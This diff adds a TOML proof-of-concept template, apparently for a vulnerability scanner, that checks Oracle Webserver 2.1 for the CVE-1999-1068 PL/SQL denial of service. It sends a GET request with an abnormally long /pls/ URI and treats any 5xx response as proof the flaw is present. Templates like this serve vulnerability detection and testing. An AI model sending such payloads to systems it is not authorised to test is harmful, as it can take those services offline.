@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "验证目标 Oracle HTTP Server 2.1 在处理 PL/SQL 存储过程请求时，是否因未校验请求行长度而存在拒绝服务漏洞。通过向目标发送一个包含超长请求 URI（含 PL/SQL 路径）的 HTTP GET 请求，观察服务端是否返回异常、连接断开或服务不可用，从而确认漏洞存在。"
+id = "POC-AVE-1999-1317"
+name = "CVE-1999-1068 Oracle Webserver 2.1 PL/SQL 长 HTTP 请求拒绝服务 PoC"
+severity = "medium"
+tags = ["ave-1999-1317"]
+vuln_id = [
+    "CVE-1999-1068",
+    "AVE-1999-1317",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/pls/long_package_name_that_is_abnormally_long_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"
+protocol = "http"
+
+[poc.requests.body]
+content = ""
+type = "raw"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    500,
+    502,
+    503,
+    504,
+]
+type = "status"
